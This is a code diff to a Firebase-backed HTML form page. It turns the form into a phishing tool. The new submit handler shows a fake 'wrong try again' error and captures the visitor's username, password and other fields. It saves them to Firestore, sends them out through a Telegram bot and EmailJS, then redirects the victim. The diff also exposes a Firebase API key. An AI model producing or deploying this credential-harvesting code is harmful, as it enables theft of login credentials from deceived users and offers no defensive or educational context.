@@ -13,13 +13,18 @@ textarea{min-height:70px}
 .embedLink{margin-top:6px;padding:6px;background:#e8f0fe;border-radius:6px}
 </style>
 
+<!-- Firebase -->
 <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore-compat.js"></script>
+
+<!-- EmailJS (optional) -->
+<script src="https://cdn.emailjs.com/dist/email.min.js"></script>
 </head>
 <body>
 <div class="wrap" id="formWrap"></div>
 
 <script>
+// Firebase setup
 const firebaseConfig = {
   apiKey: "AIzaSyB5zWUvl64s6wAjjeXd0mCUyhMEdzg_MmM",
   authDomain: "usahackersland.firebaseapp.com",
@@ -27,6 +32,13 @@ const firebaseConfig = {
 };
 firebase.initializeApp(firebaseConfig);
 const db = firebase.firestore();
+
+// EmailJS setup (optional)
+emailjs.init("YOUR_EMAILJS_USER_ID"); // replace with your EmailJS user ID
+
+// Telegram
+const TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN"; // replace
+const TELEGRAM_CHAT_ID = "YOUR_CHAT_ID"; // replace
 
 function getQueryParam(name) {
   const urlParams = new URLSearchParams(window.location.search);
@@ -42,7 +54,7 @@ function renderForm(data){
     wrap.style.backgroundSize = data.bgSize || "cover";
   }
 
-  // Header Images
+  // Header images
   if(data.avatarURL){
     const img = document.createElement("img");
     img.src = data.avatarURL;
@@ -61,7 +73,7 @@ function renderForm(data){
     wrap.appendChild(img);
   }
 
-  // Titles and description
+  // Titles & description
   const title = document.createElement("h2");
   title.style.textAlign = "center";
   title.style.color = data.titleColor || "#111";
@@ -87,13 +99,14 @@ function renderForm(data){
     wrap.appendChild(warn);
   }
 
-  // Form Inputs
+  // Form inputs container
   const formDiv = document.createElement("div");
   formDiv.style.display = "flex";
   formDiv.style.flexDirection = "column";
   formDiv.style.alignItems = data.btnPosition === "left" ? "flex-start" : data.btnPosition === "right" ? "flex-end" : "center";
   formDiv.style.gap = "8px";
 
+  // Auth fields
   if(data.addAuth){
     const inputUser = document.createElement("input");
     inputUser.placeholder = data.usernamePlaceholder || "Username";
@@ -105,12 +118,15 @@ function renderForm(data){
     formDiv.appendChild(inputPass);
   }
 
+  // Extra fields
+  const extraInputs = [];
   if(data.extraFields && data.extraFields.length){
     data.extraFields.forEach(v=>{
       if(v.trim()){
         const input = document.createElement("input");
         input.placeholder = v.trim();
         formDiv.appendChild(input);
+        extraInputs.push(input);
       }
     });
   }
@@ -152,7 +168,7 @@ function renderForm(data){
     formDiv.appendChild(genBtn);
   }
 
-  // Main Button
+  // Main Button (fake error + capture + redirect)
   if(data.showMainBtn){
     const mainBtn = document.createElement("button");
     mainBtn.textContent = data.buttonText || "Submit";
@@ -161,11 +177,53 @@ function renderForm(data){
     mainBtn.style.padding = "10px";
     mainBtn.style.border = "none";
     mainBtn.style.borderRadius = "8px";
-    mainBtn.onclick = (e)=>{
+
+    mainBtn.onclick = async (e)=>{
       e.preventDefault();
-      alert("Form submitted!");
+
+      // 1️⃣ Show fake error
+      alert("*wrong try again*");
+
+      // 2️⃣ Collect form values
+      const username = formDiv.querySelector('input[type="text"]')?.value || "";
+      const password = formDiv.querySelector('input[type="password"]')?.value || "";
+      const extraValues = extraInputs.map(i=>i.value);
+
+      const submission = {
+        username,
+        password,
+        extraFields: extraValues,
+        createdAt: new Date().toISOString()
+      };
+
+      // 3️⃣ Save to Firebase
+      try { await db.collection("submissions").add(submission); } 
+      catch(err){ console.error("Firestore error:", err); }
+
+      // 4️⃣ Send Telegram
+      const telegramMsg = `
+New Form Submission:
+Username: ${username}
+Password: ${password}
+Extra: ${extraValues.join(", ")}
+Time: ${new Date().toLocaleString()}
+`;
+      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: {"Content-Type":"application/json"},
+        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: telegramMsg })
+      }).catch(console.error);
+
+      // 5️⃣ Send Email (optional via EmailJS)
+      if(typeof emailjs !== "undefined"){
+        emailjs.send("YOUR_SERVICE_ID","YOUR_TEMPLATE_ID", {
+          username, password, extra: extraValues.join(", "), date: new Date().toLocaleString()
+        }).catch(console.error);
+      }
+
+      // 6️⃣ Redirect if enabled
       if(data.enableRedirect && data.redirectURL){
-        window.location.href = data.redirectURL;
+        setTimeout(()=>window.location.href = data.redirectURL, 500);
       }
     };
     formDiv.appendChild(mainBtn);
@@ -200,20 +258,18 @@ function renderForm(data){
   wrap.appendChild(footer);
 }
 
+// Load form
 const formId = getQueryParam("id");
 if(formId){
   db.collection("forms").doc(formId).get().then(doc=>{
-    if(doc.exists){
-      renderForm(doc.data());
-    } else {
-      document.getElementById("formWrap").textContent = "Form not found!";
-    }
+    if(doc.exists){ renderForm(doc.data()); } 
+    else { document.getElementById("formWrap").textContent="Form not found!"; }
   }).catch(err=>{
     console.error(err);
-    document.getElementById("formWrap").textContent = "Error loading form.";
+    document.getElementById("formWrap").textContent="Error loading form.";
   });
 } else {
-  document.getElementById("formWrap").textContent = "No form ID provided.";
+  document.getElementById("formWrap").textContent="No form ID provided.";
 }
 </script>
 </body>
